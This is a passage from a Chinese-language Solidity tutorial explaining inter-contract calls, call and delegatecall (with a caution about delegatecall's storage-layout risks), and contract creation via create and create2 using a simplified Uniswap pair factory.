可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CallContract&#123;</span><br><span class="line">    function callSetX(address _Address, uint256 x) external&#123;</span><br><span class="line">        OtherContract(_Address).setX(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callGetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">        x = _Address.getX();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callGetX2(address _Address) external view returns(uint x)&#123;</span><br><span class="line">        OtherContract oc = OtherContract(_Address);</span><br><span class="line">        x = oc.getX();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setXTransferETH(address otherContract, uint256 x) payable external&#123;</span><br><span class="line">        OtherContract(otherContract).setX&#123;value: msg.value&#125;(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h2><p><code>call</code> 是<code>address</code>类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, data)</code>，分别对应<code>call</code>是否成功以及目标函数的返回值。</p><ul><li><code>call</code>是<code>solidity</code>官方推荐的通过触发<code>fallback</code>或<code>receive</code>函数发送<code>ETH</code>的方法。</li><li>不推荐用<code>call</code>来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数</li><li>当我们不知道对方合约的源代码或<code>ABI</code>，就没法生成合约变量；这时，我们仍可以通过<code>call</code>调用对方合约的函数。</li></ul><h3 id="Call的使用规则"><a href="#Call的使用规则" class="headerlink" title="Call的使用规则"></a><code>Call</code>的使用规则</h3><p><code>call</code>的使用规则如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call(二进制编码);</span><br></pre></td></tr></table></figure><p>其中<code>二进制编码</code>利用结构化编码函数<code>abi.encodeWithSignature</code>获得：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><p><code>函数签名</code>为<code>&quot;函数名（逗号分隔的参数类型)&quot;</code>。例如<code>abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</code>。</p><p>另外<code>call</code>在调用合约时可以指定交易发送的<code>ETH</code>数额和<code>gas</code>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(二进制编码);</span><br></pre></td></tr></table></figure><h3 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h3><p>我们先写一个简单的目标合约<code>OtherContract</code>并部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private _x = 0; // 状态变量x</span><br><span class="line">    // 收到eth的事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    fallback() external payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约包含一个状态变量<code>x</code>，一个在收到<code>ETH</code>时触发的事件<code>Log</code>，三个函数：</p><ul><li><code>getBalance()</code>: 返回合约<code>ETH</code>余额。</li><li><code>setX()</code>: <code>external payable</code>函数，可以设置<code>x</code>的值，并向合约发送<code>ETH</code>。</li><li><code>getX()</code>: 读取<code>x</code>的值。</li></ul><h3 id="利用Call调用目标合约"><a href="#利用Call调用目标合约" class="headerlink" title="利用Call调用目标合约"></a>利用<code>Call</code>调用目标合约</h3><h4 id="1-Response事件"><a href="#1-Response事件" class="headerlink" title="1. Response事件"></a><strong>1. Response事件</strong></h4><p>我们写一个<code>Call</code>合约来调用目标合约函数。首先定义一个<code>Response</code>事件，输出<code>call</code>返回的<code>success</code>和<code>data</code>，方便我们观察返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 定义Response事件，输出call返回的结果success和data</span><br><span class="line">event Response(bool success, bytes data);</span><br></pre></td></tr></table></figure><h4 id="2-调用setX函数"><a href="#2-调用setX函数" class="headerlink" title="2. 调用setX函数"></a><strong>2. 调用setX函数</strong></h4><p>我们定义<code>callSetX</code>函数来调用目标合约的<code>setX()</code>，转入<code>msg.value</code>数额的<code>ETH</code>，并释放<code>Response</code>事件输出<code>success</code>和<code>data</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address payable _addr, uint256 x) public payable &#123;</span><br><span class="line">    // call setX()，同时可以发送ETH</span><br><span class="line">    (bool success, bytes memory data) = _addr.call&#123;value: msg.value&#125;(</span><br><span class="line">        abi.encodeWithSignature(&quot;setX(uint256)&quot;, x)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit Response(success, data); //释放事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们调用<code>callSetX</code>把状态变量<code>_x</code>改为5，参数为<code>OtherContract</code>地址和<code>5</code>，由于目标函数<code>setX()</code>没有返回值，因此<code>Response</code>事件输出的<code>data</code>为<code>0x</code>，也就是空。</p><h4 id="3-调用getX函数"><a href="#3-调用getX函数" class="headerlink" title="3. 调用getX函数"></a><strong>3. 调用getX函数</strong></h4><p>下面我们调用<code>getX()</code>函数，它将返回目标合约<code>_x</code>的值，类型为<code>uint256</code>。我们可以利用<code>abi.decode</code>来解码<code>call</code>的返回值<code>data</code>，并读出数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(address _addr) external returns(uint256)&#123;</span><br><span class="line">    // call getX()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;getX()&quot;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit Response(success, data); //释放事件</span><br><span class="line">    return abi.decode(data, (uint256));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>Response</code>事件的输出，我们可以看到<code>data</code>为<code>0x0000000000000000000000000000000000000000000000000000000000000005</code>。而经过<code>abi.decode</code>，最终返回值为<code>5</code>。</p><h4 id="4-调用不存在的函数"><a href="#4-调用不存在的函数" class="headerlink" title="4. 调用不存在的函数"></a><strong>4. 调用不存在的函数</strong></h4><p>如果我们给<code>call</code>输入的函数不存在于目标合约，那么目标合约的<code>fallback</code>函数会被触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function callNonExist(address _addr) external&#123;</span><br><span class="line">    // call getX()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit Response(success, data); //释放事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面例子中，我们<code>call</code>了不存在的<code>foo</code>函数。<code>call</code>仍能执行成功，并返回<code>success</code>，但其实调用的目标合约<code>fallback</code>函数。</p><h2 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h2><p><code>delegatecall</code>与<code>call</code>类似，是<code>solidity</code>中地址类型的低级成员函数。<code>delegate</code>中是委托/代表的意思，那么<code>delegatecall</code>委托了什么？</p><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>语境</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/image/media/2022/Solidity/img1/1.png"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/image/media/2022/Solidity/img1/2.png"></p><p>大家可以这样理解：一个<code>富商</code>把它的资产（<code>状态变量</code>）都交给一个<code>VC</code>代理（<code>目标合约</code>的函数）来打理。执行的是<code>VC</code>的函数，但是改变的是<code>富商</code>的状态。</p><p><code>delegatecall</code>语法和<code>call</code>类似，也是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.delegatecall(二进制编码);</span><br></pre></td></tr></table></figure><p>其中<code>二进制编码</code>利用结构化编码函数<code>abi.encodeWithSignature</code>获得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><p><code>函数签名</code>为<code>&quot;函数名（逗号分隔的参数类型)&quot;</code>。例如<code>abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</code>。</p><p>和<code>call</code>不一样，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额</p><blockquote><p><strong>注意</strong>：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p></blockquote><h3 id="什么情况下会用到delegatecall"><a href="#什么情况下会用到delegatecall" class="headerlink" title="什么情况下会用到delegatecall?"></a>什么情况下会用到<code>delegatecall</code>?</h3><p>目前<code>delegatecall</code>主要有两个应用场景：</p><ol><li>代理合约（<code>Proxy Contract</code>）：将智能合约的存储合约和逻辑合约分开：代理合约（<code>Proxy Contract</code>）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（<code>Logic Contract</code>）里，通过<code>delegatecall</code>执行。当升级时，只需要将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。 更多信息请查看：<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>。</li></ol><h3 id="delegatecall例子"><a href="#delegatecall例子" class="headerlink" title="delegatecall例子"></a><code>delegatecall</code>例子</h3><p>调用结构：你（<code>A</code>）通过合约<code>B</code>调用目标合约<code>C</code>。</p><h4 id="被调用的合约C"><a href="#被调用的合约C" class="headerlink" title="被调用的合约C"></a>被调用的合约C</h4><p>我们先写一个简单的目标合约<code>C</code>：有两个<code>public</code>变量：<code>num</code>和<code>sender</code>，分别是<code>uint256</code>和<code>address</code>类型；有一个函数，可以将<code>num</code>设定为传入的<code>_num</code>，并且将<code>sender</code>设为<code>msg.sender</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 被调用的合约C</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发起调用的合约B"><a href="#发起调用的合约B" class="headerlink" title="发起调用的合约B"></a>发起调用的合约B</h4><p>首先，合约<code>B</code>必须和目标合约<code>C</code>的变量存储布局必须相同，两个变量，并且顺序为<code>num</code>和<code>sender</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract B &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br></pre></td></tr></table></figure><p>接下来，我们分别用<code>call</code>和<code>delegatecall</code>来调用合约<code>C</code>的<code>setVars</code>函数，更好的理解它们的区别。</p><p><code>callSetVars</code>函数通过<code>call</code>来调用<code>setVars</code>。它有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line">function callSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">    // call setVars()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>delegatecallSetVars</code>函数通过<code>delegatecall</code>来调用<code>setVars</code>。与上面的<code>callSetVars</code>函数相同，有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">    function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // delegatecall setVars()</span><br><span class="line">        (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="本节代码-3"><a href="#本节代码-3" class="headerlink" title="本节代码"></a>本节代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">// delegatecall和call类似，都是低级函数</span><br><span class="line">// call: B call C, 语境为 C (msg.sender = B, C中的状态变量受影响)</span><br><span class="line">// delegatecall: B delegatecall C, 语境为B (msg.sender = A, B中的状态变量受影响)</span><br><span class="line">// 注意B和C的数据存储布局必须相同！变量类型、声明的前后顺序要相同，不然会搞砸合约。</span><br><span class="line"></span><br><span class="line">// 被调用的合约C</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 发起delegatecall的合约B</span><br><span class="line">contract B &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    // 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line">    function callSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // call setVars()</span><br><span class="line">        bool success;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        ( success, data) = _addr.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">    function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // delegatecall setVars()</span><br><span class="line">        bool success;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        (success, data) = _addr.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a>在合约中创建新合约</h2><p>在以太坊链上，用户（外部账户，<code>EOA</code>）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所<code>uniswap</code>就是利用工厂合约（<code>Factory</code>）创建了无数个币对合约（<code>Pair</code>）。这一讲，我会用简化版的<code>uniswap</code>讲如何通过合约创建合约。</p><p>有两种方法可以在合约中创建新合约，<code>create</code>和<code>create2</code>，这里我们讲<code>create</code>，下一讲会介绍<code>create2</code>。</p><h3 id="Create"><a href="#Create" class="headerlink" title="Create"></a><code>Create</code></h3><p><code>create</code>的用法很简单，就是<code>new</code>一个合约，并传入新合约构造函数所需的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Contract x = new Contract&#123;value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><h4 id="极简Uniswap"><a href="#极简Uniswap" class="headerlink" title="极简Uniswap"></a>极简Uniswap</h4><p><code>Uniswap V2</code><a href="https://github.com/Uniswap/v2-core/tree/master/contracts">核心合约</a>中包含两个合约：</p><ol><li>UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。</li><li>UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。</li></ol><p>下面我们用<code>create</code>方法实现一个极简版的<code>Uniswap</code>：<code>Pair</code>币对合约负责管理币对地址，<code>PairFactory</code>工厂合约用于创建新的币对，并管理币对地址。</p><h4 id="Pair合约"><a href="#Pair合约" class="headerlink" title="Pair合约"></a><code>Pair</code>合约</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Pair&#123;</span><br><span class="line">    address public factory; // 工厂合约地址</span><br><span class="line">    address public token0; // 代币1</span><br><span class="line">    address public token1; // 代币2</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><blockquote><p><strong>提问</strong>：为什么<code>uniswap</code>不在<code>constructor</code>中将<code>token0</code>和<code>token1</code>地址更新好？</p><p><strong>答</strong>：因为<code>uniswap</code>使用的是<code>create2</code>创建合约，限制构造函数不能有参数。当使用<code>create</code>时，<code>Pair</code>合约允许构造函数有参数，可以在<code>constructor</code>中将<code>token0</code>和<code>token1</code>地址更新好。</p></blockquote><h4 id="PairFactory"><a href="#PairFactory" class="headerlink" title="PairFactory"></a><code>PairFactory</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract PairFactory&#123;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">    address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">    function createPair(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">        // 创建新合约</span><br><span class="line">        Pair pair = new Pair(); </span><br><span class="line">        // 调用新合约的initialize方法</span><br><span class="line">        pair.initialize(tokenA, tokenB);</span><br><span class="line">        // 更新地址map</span><br><span class="line">        pairAddr = address(pair);</span><br><span class="line">        allPairs.push(pairAddr);</span><br><span class="line">        getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">        getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有代币地址。</p><p><code>PairFactory</code>合约只有一个<code>createPair</code>函数，根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pair pair = new Pair(); </span><br></pre></td></tr></table></figure><p>就是创建合约的代码，非常简单。大家可以部署好<code>PairFactory</code>合约，然后用下面两个地址作为参数调用<code>createPair</code>，看看创建的币对地址是什么：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78</span><br><span class="line">BSC链上的PEOPLE地址:</span><br><span class="line">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span><br></pre></td></tr></table></figure><h3 id="Create2"><a href="#Create2" class="headerlink" title="Create2"></a><code>Create2</code></h3><p><code>CREATE2</code> 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。<code>Uniswap</code>创建<code>Pair</code>合约用的就是<code>CREATE2</code>而不是<code>CREATE</code>。</p><h4 id="CREATE如何计算地址"><a href="#CREATE如何计算地址" class="headerlink" title="CREATE如何计算地址"></a>CREATE如何计算地址</h4><p>智能合约可以由其他合约和普通账户利用<code>CREATE</code>操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和<code>nonce</code>(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新地址 = hash(创建者地址, nonce)</span><br></pre></td></tr></table></figure><p>创建者地址不会变，但<code>nonce</code>可能会随时间而改变，因此用<code>CREATE</code>创建的合约地址不好预测。</p><h4 id="CREATE2如何计算地址"><a href="#CREATE2如何计算地址" class="headerlink" title="CREATE2如何计算地址"></a>CREATE2如何计算地址</h4><p><code>CREATE2</code>的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<code>CREATE2</code>创建的合约地址由4个部分决定：</p><ul><li><code>0xFF</code>：一个常数，避免和<code>CREATE</code>冲突</li><li>创建者地址</li><li><code>salt</code>（盐）：一个创建者给定的数值</li><li>待部署合约的字节码（<code>bytecode</code>）</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新地址 = hash(&quot;0xFF&quot;,创建者地址, salt, bytecode)</span><br></pre></td></tr></table></figure><p><code>CREATE2</code> 确保，如果创建者使用 <code>CREATE2</code> 和提供的 <code>salt</code> 部署给定的合约<code>bytecode</code>，它将存储在 <code>新地址</code> 中。</p><h4 id="如何使用CREATE2"><a href="#如何使用CREATE2" class="headerlink" title="如何使用CREATE2"></a>如何使用<code>CREATE2</code></h4><p><code>CREATE2</code>的用法和之前讲的<code>Create</code>类似，同样是<code>new</code>一个合约，并传入新合约构造函数所需的参数，只不过要多传一个<code>salt</code>参数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），<code>_salt</code>是指定的盐；如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><h4 id="极简Uniswap2"><a href="#极简Uniswap2" class="headerlink" title="极简Uniswap2"></a>极简Uniswap2</h4><p>跟<a href="https://mirror.xyz/dashboard/edit/kojopp2CgDK3ehHxXc_2fkZe87uM0O5OmsEU6y83eJs">上一讲</a>类似，我们用<code>Create2</code>来实现极简<code>Uniswap</code>。</p><h4 id="Pair"><a href="#Pair" class="headerlink" title="Pair"></a><code>Pair</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Pair&#123;</span><br><span class="line">    address public factory; // 工厂合约地址</span><br><span class="line">    address public token0; // 代币1</span><br><span class="line">    address public token1; // 代币2</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    